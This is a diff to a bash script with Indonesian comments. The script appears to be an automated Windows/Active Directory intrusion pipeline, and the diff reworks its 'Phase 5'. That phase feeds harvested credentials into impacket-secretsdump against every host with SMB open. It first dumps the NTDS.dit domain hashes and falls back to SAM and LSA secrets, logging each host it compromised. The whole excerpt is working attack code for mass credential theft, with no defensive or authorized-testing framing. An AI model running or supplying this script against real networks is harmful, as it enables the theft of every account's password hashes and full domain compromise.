@@ -604,103 +604,135 @@ fi
 # PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
 #====================================================
 if [[ -s "$FINAL_CREDS_FILE" ]]; then
-    
-    # File temporary untuk mencatat IP DC yang SUDAH BERHASIL di-dump
+
+    echo -e "${BLUE}[*] Preparing unique credentials for Secretsdump...${NC}"
+
+    # Ambil hanya:
+    # IP;USER:PASS
+    # Buang kolom protocol lalu sort unik
+    UNIQUE_CREDS_FILE="$OUTDIR/.unique_secretsdump_creds.tmp"
+
+    cut -d';' -f2-3 "$FINAL_CREDS_FILE" | sort -u > "$UNIQUE_CREDS_FILE"
+
+    TOTAL_UNIQUE=$(wc -l < "$UNIQUE_CREDS_FILE" 2>/dev/null)
+
+    echo -e "${GREEN}[+] Deduplicated credentials for Secretsdump: $TOTAL_UNIQUE unique entries${NC}"
+    echo -e "${YELLOW}--> $UNIQUE_CREDS_FILE${NC}"
+
+    # File temporary untuk mencatat IP yang SUDAH BERHASIL di-dump
     DUMPED_IPS_TRACKER="$OUTDIR/.dumped_ips.tmp"
     : > "$DUMPED_IPS_TRACKER"
-    
-    while IFS=; read -r cred_line || [[ -n "$cred_line" ]]; do
-        [[ -z "$cred_line" ]] && continue
-        
-        # Ekstraksi komponen kredensial (Menangkap kolom ke-1 sebagai protokol)
-        cred_proto=$(echo "$cred_line" | cut -d';' -f1)
-        ip=$(echo "$cred_line" | cut -d';' -f2)
-        user_pass=$(echo "$cred_line" | cut -d';' -f3)
+
+    while IFS=';' read -r ip user_pass || [[ -n "$ip" ]]; do
+
+        [[ -z "$ip" ]] && continue
+
         cred_user=$(echo "$user_pass" | cut -d':' -f1)
-        cred_pass=$(echo "$user_pass" | cut -d':' -f2)
+        cred_pass=$(echo "$user_pass" | cut -d':' -f2-)
+
         # -----------------------------------------------------------
-        # OPTIMASI: Cek Apakah Port 445 Terbuka Terlebih Dahulu
+        # OPTIMASI: Cek Port 445
         # -----------------------------------------------------------
         if ! timeout 2s bash -c "3<>/dev/tcp/$ip/445" 2>/dev/null; then
             echo -e "${GRAY}[*] Skipping secretsdump on $ip - Port 445 (SMB) is closed.${NC}"
             continue
         fi
-        
+
         # -----------------------------------------------------------
-        # Cek apakah IP ini sudah sukses di-dump sebelumnya
+        # Cek apakah host sudah pernah berhasil dump
         # -----------------------------------------------------------
         if grep -q "^$ip$" "$DUMPED_IPS_TRACKER" 2>/dev/null; then
             echo -e "${GRAY}[*] Skipping $ip using $cred_user - NTDS already successfully dumped for this host.${NC}"
             continue
         fi
-        
-        if [[ "$cred_proto" =~ ^(smb|ldap|rdp|wmi|winrm|mssql)$ ]]; then
-            DOMAIN=$(get_domain "$ip")
-        else
-            DOMAIN="."
-        fi
+
+        DOMAIN=$(get_domain "$ip")
         [[ "$DOMAIN" == "." ]] && DOMAIN="WORKGROUP"
 
-        echo -e "${YELLOW}[*] Attempting secretsdump on $ip using $cred_user (${cred_proto^^})...${NC}"
+        echo -e "${YELLOW}[*] Attempting secretsdump on $ip using $cred_user...${NC}"
 
         dump_out_name="$OUTDIR/secretsdump_${DOMAIN}_${ip}_${cred_user}"
 
-        # --- BUILD TARGET STRING (DOMAIN / LOCAL SAFE) ---
+        # -----------------------------------------------------------
+        # BUILD TARGET STRING
+        # -----------------------------------------------------------
         if [[ "$DOMAIN" == "WORKGROUP" ]]; then
             TARGET_STRING="$cred_user:$cred_pass@$ip"
         else
             TARGET_STRING="$DOMAIN/$cred_user:$cred_pass@$ip"
         fi
 
-        # --- STEP 1: JUST-DC ---
+        # -----------------------------------------------------------
+        # STEP 1 : JUST-DC
+        # -----------------------------------------------------------
         echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
         echo -e "${BLUE}--- SECRETSDUMP JUST-DC OUTPUT ---${NC}"
 
-        timeout 120s impacket-secretsdump -just-dc "$TARGET_STRING" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
+        timeout 120s impacket-secretsdump \
+            -just-dc \
+            "$TARGET_STRING" \
+            -outputfile "$dump_out_name" \
+            2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
 
         echo -e "${BLUE}----------------------------------${NC}"
 
-        # --- CHECK NTDS SUCCESS ---
+        # -----------------------------------------------------------
+        # SUCCESS JUST-DC
+        # -----------------------------------------------------------
         if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
+
             echo -e "${GREEN}[+++] SUCCESS! NTDS.dit dumped from $ip${NC}"
             echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"
 
             echo "$ip" >> "$DUMPED_IPS_TRACKER"
 
         else
+
             echo -e "${YELLOW}[!] JUST-DC failed, trying full secretsdump...${NC}"
 
-            # --- STEP 2: FULL DUMP ---
+            # -----------------------------------------------------------
+            # STEP 2 : FULL SECRETSDUMP
+            # -----------------------------------------------------------
             echo -e "${GRAY}[CMD] timeout 180s impacket-secretsdump \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
             echo -e "${BLUE}--- SECRETSDUMP FULL OUTPUT ---${NC}"
 
-            timeout 180s impacket-secretsdump "$TARGET_STRING" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
+            timeout 180s impacket-secretsdump \
+                "$TARGET_STRING" \
+                -outputfile "$dump_out_name" \
+                2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
 
             echo -e "${BLUE}--------------------------------${NC}"
 
-            # --- CHECK LOCAL DUMP SUCCESS ---
+            # -----------------------------------------------------------
+            # SUCCESS FULL DUMP
+            # -----------------------------------------------------------
             if [[ -s "${dump_out_name}.sam" || -s "${dump_out_name}.secrets" ]]; then
+
                 echo -e "${GREEN}[+++] SUCCESS! SAM/LSA secrets dumped from $ip${NC}"
                 echo -e "${GREEN}[+] Output files: ${dump_out_name}.sam / .secrets${NC}"
 
                 echo "$ip" >> "$DUMPED_IPS_TRACKER"
 
             else
+
                 echo -e "${RED}[-] Failed to dump any secrets from $ip using $cred_user${NC}"
                 echo -e "${GRAY}[DEBUG] Check $OUTDIR/secretsdump_run.log${NC}"
 
-                # cleanup kalau gagal
-                rm -f "${dump_out_name}.ntds" "${dump_out_name}.sam" "${dump_out_name}.secrets" 2>/dev/null
+                rm -f \
+                    "${dump_out_name}.ntds" \
+                    "${dump_out_name}.sam" \
+                    "${dump_out_name}.secrets" \
+                    2>/dev/null
             fi
         fi
 
         echo "------------------------------------------------------------"
 
-            
-        done < "$FINAL_CREDS_FILE"
-        
-        # Hapus file tracker setelah selesai phase 5
-        rm -f "$DUMPED_IPS_TRACKER"
+    done < "$UNIQUE_CREDS_FILE"
+
+    rm -f "$UNIQUE_CREDS_FILE"
+    rm -f "$DUMPED_IPS_TRACKER"
+
 fi
 
 if [[ -s "$BROKEN_PIPE_LOG" ]]; then
